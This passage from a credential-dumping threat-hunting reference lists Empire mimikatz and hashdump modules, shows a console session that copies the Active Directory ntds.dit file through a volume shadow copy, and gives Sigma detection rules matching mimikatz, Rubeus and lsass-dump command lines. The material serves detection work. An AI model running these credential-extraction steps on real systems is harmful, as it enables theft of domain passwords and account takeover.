  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/extract_tickets',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/golden_ticket',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/golden_ticket',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/logonpasswords',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/logonpasswords',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/lsadump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/lsadump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/mimitokens',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/mimitokens',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/sam',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/sam',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/silver_ticket',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/silver_ticket',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/trust_keys',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/mimikatz/trust_keys',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/powerdump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/powerdump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/vault_credential',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/vault_credential',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/downgrade_account',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/downgrade_account',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/wdigest_downgrade',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/wdigest_downgrade',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/gpp',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/gpp',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/mcafee_sitelist',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/mcafee_sitelist',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/collection/linux/hashdump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/collection/linux/hashdump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/collection/linux/mimipenguin',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/collection/linux/mimipenguin',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/collection/osx/hashdump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/collection/osx/hashdump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/collection/osx/kerberosdump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/collection/osx/kerberosdump',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/management/multi/kerberos_inject',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/management/multi/kerberos_inject',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/situational_awareness/network/dcos/etcd_crawler',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/situational_awareness/network/dcos/etcd_crawler',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'Dos\n'
             'C: \\ Users \\ Administrator \\ Desktop \\ test> cscript '
             'vssown.vbs / start\n'
             'Microsoft (R) Windows Script Host Version 5.812\n'
             'Copyright (C) Microsoft Corporation. all rights reserved.\n'
             '\n'
             '[*] Signal sent to start the VSS service.\n'
             '\n'
             'C: \\ Users \\ Administrator \\ Desktop \\ test> cscript '
             'vssown.vbs / create c\n'
             'Microsoft (R) Windows Script Host Version 5.812\n'
             'Copyright (C) Microsoft Corporation. all rights reserved.\n'
             '\n'
             '[*] Attempting to create a shadow copy.\n'
             '\n'
             'C: \\ Users \\ Administrator \\ Desktop \\ test> cscript '
             'vssown.vbs / list\n'
             'Microsoft (R) Windows Script Host Version 5.812\n'
             'Copyright (C) Microsoft Corporation. all rights reserved.\n'
             '\n'
             'SHADOW COPIES\n'
             '=============\n'
             '\n'
             '[*] ID: {42C8E0BD-6FD9-4CFB-B006-4640DAE84DC8}\n'
             '[*] Client accessible: True\n'
             '[*] Count: 1\n'
             '[*] Device object:? \\\\ \\ GLOBALROOT \\ Device \\ '
             'HarddiskVolumeShadowCopy1\n'
             '[*] Differential: True\n'
             '[*] Exposed locally: False\n'
             '[*] Exposed name:\n'
             '[*] Exposed remotely: False\n'
             '[*] Hardware assisted: False\n'
             '[*] Imported: False\n'
             '[*] No auto release: True\n'
             '[*] Not surfaced: False\n'
             '[*] No writers: True\n'
             '[*] Originating machine: ICBC.abcc.org\n'
             '[*] Persistent: True\n'
             '[*] Plex: False\n'
             '[*] Provider ID: {B5946137-7B9F-4925-AF80-51ABD60B20D5}\n'
             '[*] Service machine: ICBC.abcc.org\n'
             '[*] Set ID: {584C48BF-649D-4B35-9CAE-3165C2C8BE53}\n'
             '[*] State: 12\n'
             '[*] Transportable: False\n'
             '[*] Volume name:? \\\\ \\ Volume '
             '{16da2094-7213-420f-a023-db7b3e3a7f6f} \\\n'
             '\n'
             '\n'
             'C: \\ Users \\ Administrator \\ Desktop \\ test> copy \\\\ \\ '
             'GLOBALROOT \\ Device \\ HarddiskVolumeShadowCopy1 \\ windows \\ '
             'ntds \\ ntds.dit C:? \\\n'
             'We have copied a file.\n'
             '\n'
             'C: \\ Users \\ Administrator \\ Desktop \\ test> cscript '
             'vssown.vbs / delete\n'
             'Microsoft (R) Windows Script Host Version 5.812\n'
             'Copyright (C) Microsoft Corporation. all rights reserved.',
  'name': 'Dos',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Florian Roth',
                  'date': '2019/02/21',
                  'description': 'Detects Russian group activity as described '
                                 'in Global Threat Report 2019 by Crowdstrike',
                  'detection': {'condition': 'selection1 or selection2',
                                'selection1': {'CommandLine': '* /S /E /C /Q '
                                                              '/H \\\\*',
                                               'Image': '*\\xcopy.exe'},
                                'selection2': {'CommandLine': '* -snapshot "" '
                                                              'c:\\users\\\\*',
                                               'Image': '*\\adexplorer.exe'}},
                  'falsepositives': ['unknown'],
                  'id': 'b83f5166-9237-4b5e-9cd4-7b5d52f4d8ee',
                  'level': 'critical',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/'],
                  'tags': ['attack.credential_access',
                           'attack.t1081',
                           'attack.t1003'],
                  'title': 'Judgement Panda Exfil Activity'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2018/09/09',
                  'description': 'Detects a highly relevant Antivirus alert '
                                 'that reports a password dumper',
                  'detection': {'condition': 'selection',
                                'selection': {'Signature': ['*DumpCreds*',
                                                            '*Mimikatz*',
                                                            '*PWCrack*',
                                                            'HTool/WCE',
                                                            '*PSWtool*',
                                                            '*PWDump*',
                                                            '*SecurityTool*',
                                                            '*PShlSpy*']}},
                  'falsepositives': ['Unlikely'],
                  'fields': ['FileName', 'User'],
                  'id': '78cc2dd2-7d20-4d32-93ff-057084c38b93',
                  'level': 'critical',
                  'logsource': {'product': 'antivirus'},
                  'modified': '2019/10/04',
                  'references': ['https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/'],
                  'tags': ['attack.credential_access', 'attack.t1003'],
                  'title': 'Antivirus Password Dumper Detection'}},
 {'data_source': {'author': 'Markus Neis',
                  'date': '2018/07/24',
                  'description': 'Detects possible SafetyKatz Behaviour',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': 11,
                                              'TargetFilename': '*\\Temp\\debug.bin'}},
                  'falsepositives': ['Unknown'],
                  'id': 'e074832a-eada-4fd7-94a1-10642b130e16',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'references': ['https://github.com/GhostPack/SafetyKatz'],
                  'status': 'experimental',
                  'tags': ['attack.credential_access', 'attack.t1003'],
                  'title': 'Detection of SafetyKatz'}},
 {'data_source': {'author': 'Samir Bousseaden',
                  'description': 'Detects process LSASS memory dump using '
                                 'procdump or taskmgr based on the CallTrace '
                                 'pointing to dbghelp.dll or dbgcore.dll for '
                                 'win10',
                  'detection': {'condition': 'selection',
                                'selection': {'CallTrace': ['*dbghelp.dll*',
                                                            '*dbgcore.dll*'],
                                              'EventID': 10,
                                              'GrantedAccess': '0x1fffff',
                                              'TargetImage': 'C:\\windows\\system32\\lsass.exe'}},
                  'falsepositives': ['unknown'],
                  'id': '5ef9853e-4d0e-4a70-846f-a9ca37d876da',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'references': ['https://blog.menasec.net/2019/02/threat-hunting-21-procdump-or-taskmgr.html'],
                  'status': 'experimental',
                  'tags': ['attack.t1003',
                           'attack.s0002',
                           'attack.credential_access'],
                  'title': 'LSASS Memory Dump'}},
 {'data_source': {'description': 'Detects process access to LSASS which is '
                                 'typical for Mimikatz (0x1000 PROCESS_QUERY_ '
                                 'LIMITED_INFORMATION, 0x0400 PROCESS_QUERY_ '
                                 'INFORMATION "only old versions", 0x0010 '
                                 'PROCESS_VM_READ)',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': 10,
                                              'GrantedAccess': ['0x1410',
                                                                '0x1010'],
                                              'TargetImage': 'C:\\windows\\system32\\lsass.exe'}},
                  'falsepositives': ['unknown'],
                  'id': '0d894093-71bc-43c3-8c4d-ecfc28dcf5d9',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'references': ['https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843&ithint=file%2cpptx&app=PowerPoint&authkey=!AMvCRTKB_V1J5ow',
                                 'https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html'],
                  'status': 'experimental',
                  'tags': ['attack.t1003',
                           'attack.s0002',
                           'attack.credential_access',
                           'car.2019-04-004'],
                  'title': 'Mimikatz Detection LSASS Access'}},
 {'data_source': {'description': 'Detects certain DLL loads when Mimikatz gets '
                                 'executed',
                  'detection': {'condition': 'selector | near dllload1 and '
                                             'dllload2 and not exclusion',
                                'dllload1': {'ImageLoaded': '*\\vaultcli.dll'},
                                'dllload2': {'ImageLoaded': '*\\wlanapi.dll'},
                                'exclusion': {'ImageLoaded': ['ntdsapi.dll',
                                                              'netapi32.dll',
                                                              'imm32.dll',
                                                              'samlib.dll',
                                                              'combase.dll',
                                                              'srvcli.dll',
                                                              'shcore.dll',
                                                              'ntasn1.dll',
                                                              'cryptdll.dll',
                                                              'logoncli.dll']},
                                'selector': {'EventID': 7,
                                             'Image': 'C:\\Windows\\System32\\rundll32.exe'},
                                'timeframe': '30s'},
                  'falsepositives': ['unknown'],
                  'id': 'c0478ead-5336-46c2-bd5e-b4c84bc3a36e',
                  'level': 'medium',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'references': ['https://securityriskadvisors.com/blog/post/detecting-in-memory-mimikatz/'],
                  'status': 'experimental',
                  'tags': ['attack.s0002',
                           'attack.t1003',
                           'attack.lateral_movement',
                           'attack.credential_access',
                           'car.2019-04-004'],
                  'title': 'Mimikatz In-Memory'}},
 {'data_source': {'author': 'Thomas Patzke',
                  'description': 'Detects password dumper activity by '
                                 'monitoring remote thread creation EventID 8 '
                                 'in combination with the lsass.exe process as '
                                 'TargetImage. The process in field Process is '
                                 'the malicious program. A single execution '
                                 'can lead to hundreds of events.',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': 8,
                                              'StartModule': None,
                                              'TargetImage': 'C:\\Windows\\System32\\lsass.exe'}},
                  'falsepositives': ['unknown'],
                  'id': 'f239b326-2f41-4d6b-9dfa-c846a60ef505',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'references': ['https://jpcertcc.github.io/ToolAnalysisResultSheet/details/WCE.htm'],
                  'status': 'stable',
                  'tags': ['attack.credential_access',
                           'attack.t1003',
                           'attack.s0005'],
                  'title': 'Password Dumper Remote Thread in LSASS'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2018/02/10',
                  'description': 'Detects a dump file written by QuarksPwDump '
                                 'password dumper',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': 11,
                                              'TargetFilename': '*\\AppData\\Local\\Temp\\SAM-*.dmp*'}},
                  'falsepositives': ['Unknown'],
                  'id': '847def9e-924d-4e90-b7c4-5f581395a2b4',
                  'level': 'critical',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'references': ['https://jpcertcc.github.io/ToolAnalysisResultSheet/details/QuarksPWDump.htm'],
                  'status': 'experimental',
                  'tags': ['attack.credential_access', 'attack.t1003'],
                  'title': 'QuarksPwDump Dump File'}},
 {'data_source': {'author': 'Markus Neis',
                  'date': '2018/08/26',
                  'description': 'Detects Access to LSASS Process',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': 1121,
                                              'Path': '*\\lsass.exe'}},
                  'falsepositives': ['Google Chrome GoogleUpdate.exe',
                                     'Some Taskmgr.exe related activity'],
                  'id': 'a0a278fe-2c0e-4de2-ac3c-c68b08a9ba98',
                  'level': 'high',
                  'logsource': {'definition': 'Requirements:Enabled Block '
                                              'credential stealing from the '
                                              'Windows local security '
                                              'authority subsystem (lsass.exe) '
                                              'from Attack Surface Reduction '
                                              '(GUID: '
                                              '9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2)',
                                'product': 'windows_defender'},
                  'references': ['https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-exploit-guard/attack-surface-reduction-exploit-guard?WT.mc_id=twitter'],
                  'status': 'experimental',
                  'tags': ['attack.credential_access', 'attack.t1003'],
                  'title': 'LSASS Access Detected via Attack Surface '
                           'Reduction'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2017/01/10',
                  'description': 'This method detects mimikatz keywords in '
                                 'different Eventlogs (some of them only '
                                 'appear in older Mimikatz version that are '
                                 'however still used by different threat '
                                 'groups)',
                  'detection': {'condition': 'keywords',
                                'keywords': {'Message': ['* mimikatz *',
                                                         '* mimilib *',
                                                         '* <3 eo.oe *',
                                                         '* eo.oe.kiwi *',
                                                         '* privilege::debug *',
                                                         '* '
                                                         'sekurlsa::logonpasswords '
                                                         '*',
                                                         '* lsadump::sam *',
                                                         '* mimidrv.sys *',
                                                         '* p::d *',
                                                         '* s::l *']}},
                  'falsepositives': ['Naughty administrators',
                                     'Penetration test'],
                  'id': '06d71506-7beb-4f22-8888-e2e5e2ca7fd8',
                  'level': 'critical',
                  'logsource': {'product': 'windows'},
                  'modified': '2019/10/11',
                  'tags': ['attack.s0002',
                           'attack.t1003',
                           'attack.lateral_movement',
                           'attack.credential_access',
                           'car.2013-07-001',
                           'car.2019-04-004'],
                  'title': 'Mimikatz Use'}},
 {'data_source': {'author': 'jmallette',
                  'description': 'Detects usage of cmdkey to look for cached '
                                 'credentials',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': '* /list *',
                                              'Image': '*\\cmdkey.exe'}},
                  'falsepositives': ['Legitimate administrative tasks.'],
                  'fields': ['CommandLine', 'ParentCommandLine', 'User'],
                  'id': '07f8bdc2-c9b3-472a-9817-5a670b872f53',
                  'level': 'low',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation',
                                 'https://technet.microsoft.com/en-us/library/cc754243(v=ws.11).aspx'],
                  'status': 'experimental',
                  'tags': ['attack.credential_access', 'attack.t1003'],
                  'title': 'Cmdkey Cached Credentials Recon'}},
 {'data_source': {'author': 'Benjamin Delpy, Florian Roth',
                  'date': '2018/06/03',
                  'description': 'Detects Mimikatz DC sync security events',
                  'detection': {'condition': 'selection and not filter1 and '
                                             'not filter2',
                                'filter1': {'SubjectDomainName': 'Window '
                                                                 'Manager'},
                                'filter2': {'SubjectUserName': ['NT AUTHORITY*',
                                                                '*$']},
                                'selection': {'EventID': 4662,
                                              'Properties': ['*Replicating '
                                                             'Directory '
                                                             'Changes All*',
                                                             '*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*']}},
                  'falsepositives': ['Valid DC Sync that is not covered by the '
                                     'filters; please report'],
                  'id': '611eab06-a145-4dfa-a295-3ccc5c20f59a',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'security'},
                  'modified': '2019/10/08',
                  'references': ['https://twitter.com/gentilkiwi/status/1003236624925413376',
                                 'https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2'],
                  'status': 'experimental',
                  'tags': ['attack.credential_access',
                           'attack.s0002',
                           'attack.t1003'],
                  'title': 'Mimikatz DC Sync'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2018/12/19',
                  'description': 'Detects command line parameters used by '
                                 'Rubeus hack tool',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': ['* asreproast *',
                                                              '* dump '
                                                              '/service:krbtgt '
                                                              '*',
                                                              '* kerberoast *',
                                                              '* createnetonly '
                                                              '/program:*',
                                                              '* ptt /ticket:*',
                                                              '* '
                                                              '/impersonateuser:*',
                                                              '* renew '
                                                              '/ticket:*',
                                                              '* asktgt '
                                                              '/user:*',
                                                              '* harvest '
                                                              '/interval:*']}},
                  'falsepositives': ['unlikely'],
                  'id': '7ec2c172-dceb-4c10-92c9-87c1881b7e18',
                  'level': 'critical',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/'],
                  'tags': ['attack.credential_access',
                           'attack.t1003',
                           'attack.s0005'],
                  'title': 'Rubeus Hack Tool'}},
 {'data_source': {'author': 'Samir Bousseaden',
                  'description': 'Detect AD credential dumping using impacket '
                                 'secretdump HKTL',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': 5145,
                                              'RelativeTargetName': 'SYSTEM32\\\\*.tmp',
                                              'ShareName': '\\\\*\\ADMIN$'}},
                  'falsepositives': ['pentesting'],
                  'id': '252902e3-5830-4cf6-bf21-c22083dfd5cf',
                  'level': 'high',
                  'logsource': {'description': 'The advanced audit policy '
                                               'setting "Object Access > Audit '
                                               'Detailed File Share" must be '
                                               'configured for Success/Failure',
                                'product': 'windows',
                                'service': 'security'},
                  'references': ['https://blog.menasec.net/2019/02/threat-huting-10-impacketsecretdump.html'],
                  'tags': ['attack.credential_access', 'attack.t1003'],
                  'title': 'Possible Impacket SecretDump remote activity'}},
 {'data_source': {'action': 'global',
                  'author': 'Florian Roth',
                  'description': 'This method detects well-known keywords of '
                                 'malicious services in the Windows System '
                                 'Eventlog',
                  'detection': {'condition': '( selection1 and keywords ) or ( '
                                             'selection2 and keywords ) or '
                                             'quarkspwdump',
                                'keywords': {'Message': ['*WCE SERVICE*',
                                                         '*WCESERVICE*',
                                                         '*DumpSvc*']},
                                'quarkspwdump': {'EventID': 16,
                                                 'HiveName': '*\\AppData\\Local\\Temp\\SAM*.dmp'},
                                'selection1': {'EventID': [7045]}},
                  'falsepositives': ['Unlikely'],
                  'id': '4976aa50-8f41-45c6-8b15-ab3fc10e79ed',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'system'},
                  'tags': ['attack.credential_access',
                           'attack.t1003',
                           'attack.s0005'],
                  'title': 'Malicious Service Install'}},
 {'data_source': {'detection': {'selection2': {'EventID': 4697}},
                  'logsource': {'product': 'windows', 'service': 'security'}}},
 {'data_source': {'author': 'Thomas Patzke',
                  'description': 'Detects wceaux.dll access while WCE '
                                 'pass-the-hash remote command execution on '
                                 'source host',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': [4656,
                                                          4658,
                                                          4660,
                                                          4663],
                                              'ObjectName': '*\\wceaux.dll'}},
                  'falsepositives': ['Penetration testing'],
                  'id': '1de68c67-af5c-4097-9c85-fe5578e09e67',
                  'level': 'critical',
                  'logsource': {'product': 'windows', 'service': 'security'},
                  'references': ['https://www.jpcert.or.jp/english/pub/sr/ir_research.html',
                                 'https://jpcertcc.github.io/ToolAnalysisResultSheet'],
                  'status': 'experimental',
                  'tags': ['attack.credential_access',
                           'attack.t1003',
                           'attack.s0005'],
                  'title': 'WCE wceaux.dll Access'}},
 {'data_source': {'author': 'Florian Roth, Tom Ueltschi',
                  'description': 'Detects NotPetya ransomware activity in '
                                 'which the extracted passwords are passed '
                                 'back to the main module via named pipe, the '
                                 'file system journal of drive C is deleted '
                                 'and windows eventlogs are cleared using '
                                 'wevtutil',
                  'detection': {'condition': '1 of them',
                                'perfc_keyword': ['*\\perfc.dat*'],
                                'pipe_com': {'CommandLine': '*\\AppData\\Local\\Temp\\\\* '
                                                            '\\\\.\\pipe\\\\*'},
                                'rundll32_dash1': {'CommandLine': '*.dat,#1',
                                                   'Image': '*\\rundll32.exe'}},
                  'falsepositives': ['Admin activity'],
                  'fields': ['CommandLine', 'ParentCommandLine'],
                  'id': '79aeeb41-8156-4fac-a0cd-076495ab82a1',
                  'level': 'critical',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://securelist.com/schroedingers-petya/78870/',
                                 'https://www.hybrid-analysis.com/sample/64b0b58a2c030c77fdb2b537b2fcc4af432bc55ffb36599a31d418c7c69e94b1?environmentId=100'],
                  'status': 'experimental',
                  'tags': ['attack.execution',
                           'attack.credential_access',
                           'attack.defense_evasion',
                           'attack.t1085',
                           'attack.t1070',
                           'attack.t1003',
                           'car.2016-04-002'],
                  'title': 'NotPetya Ransomware Activity'}},
 {'data_source': {'author': 'Modexp (idea)',
                  'date': '2019/09/02',
                  'description': 'Detects process memory dump via comsvcs.dll '
                                 'and rundll32',
                  'detection': {'condition': '(rundll_image or rundll_ofn) and '
                                             'selection',
                                'rundll_image': {'Image': '*\\rundll32.exe'},
                                'rundll_ofn': {'OriginalFileName': 'RUNDLL32.EXE'},
                                'selection': {'CommandLine': ['*comsvcs*MiniDump*full*',
                                                              '*comsvcs*MiniDumpW*full*']}},
                  'falsepositives': ['unknown'],
                  'fields': ['CommandLine', 'ParentCommandLine'],
                  'id': '09e6d5c0-05b8-4ff8-9eeb-043046ec774c',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/',
                                 'https://twitter.com/SBousseaden/status/1167417096374050817'],
                  'status': 'experimental',
                  'tags': ['attack.credential_access', 'attack.t1003'],
                  'title': 'Process dump via comsvcs DLL'}},
 {'data_source': {'description': 'Detects process handle on LSASS process with '
                                 'certain access mask and object type '
                                 'SAM_DOMAIN',
                  'detection': {'condition': 'selection',
                                'selection': {'AccessMask': '0x705',
                                              'EventID': 4656,
                                              'ObjectType': 'SAM_DOMAIN',
                                              'ProcessName': 'C:\\Windows\\System32\\lsass.exe'}},
                  'falsepositives': ['Unkown'],
                  'id': 'aa1697b7-d611-4f9a-9cb2-5125b4ccfd5c',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'security'},
                  'references': ['https://twitter.com/jackcr/status/807385668833968128'],
                  'status': 'experimental',
                  'tags': ['attack.credential_access', 'attack.t1003'],
                  'title': 'Password Dumper Activity on LSASS'}},
 {'data_source': {'author': 'Thomas Patzke',
                  'description': 'Detects execution of ntdsutil.exe, which can '
                                 'be used for various attacks against the NTDS '
                                 'database (NTDS.DIT)',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': '*\\ntdsutil*'}},
                  'falsepositives': ['NTDS maintenance'],
                  'id': '2afafd61-6aae-4df4-baed-139fa1f4c345',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://jpcertcc.github.io/ToolAnalysisResultSheet/details/ntdsutil.htm'],
                  'status': 'experimental',
                  'tags': ['attack.credential_access', 'attack.t1003'],
                  'title': 'Invocation of Active Directory Diagnostic Tool '
                           '(ntdsutil.exe)'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2018/10/30',
                  'description': 'Detects suspicious uses of the SysInternals '
                                 'Procdump utility by using a special command '
                                 'line parameter in combination with the '
                                 "lsass.exe process. This way we're also able "
                                 'to catch cases in which the attacker has '
                                 'renamed the procdump executable.',
                  'detection': {'condition': '( selection1 and selection2 ) or '
                                             'selection3',
                                'selection1': {'CommandLine': ['* -ma *']},
                                'selection2': {'CommandLine': ['* lsass*']},
                                'selection3': {'CommandLine': ['* -ma ls*']}},
                  'falsepositives': ['Unlikely, because no one should dump an '
                                     'lsass process memory',
                                     'Another tool that uses the command line '
                                     'switches of Procdump'],
                  'id': '5afee48e-67dd-4e03-a783-f74259dcf998',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'modified': '2019/10/14',
                  'references': ['Internal Research'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.t1036',
                           'attack.credential_access',
                           'attack.t1003',
                           'car.2013-05-009'],
                  'title': 'Suspicious Use of Procdump'}},
 {'data_source': {'author': 'Florian Roth',
                  'description': 'Detects suspicious SAM dump activity as '
                                 'cause by QuarksPwDump and other password '
                                 'dumpers',
                  'detection': {'condition': 'all of them',
                                'keywords': {'Message': ['*\\AppData\\Local\\Temp\\SAM-*.dmp '
                                                         '*']},
                                'selection': {'EventID': 16}},
                  'falsepositives': ['Penetration testing'],
                  'id': '839dd1e8-eda8-4834-8145-01beeee33acd',
                  'level': 'high',
                  'logsource': {'definition': 'The source of this type of '
                                              'event is Kernel-General',
                                'product': 'windows',
                                'service': 'system'},
                  'status': 'experimental',
                  'tags': ['attack.credential_access', 'attack.t1003'],
                  'title': 'SAM Dump to AppData'}},
 {'data_source': {'author': 'Markus Neis',
                  'date': '2018/04/09',
                  'description': 'Detects Access to Domain Group Policies '
                                 'stored in SYSVOL',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': '*\\SYSVOL\\\\*\\policies\\\\*'}},
                  'falsepositives': ['administrative activity'],
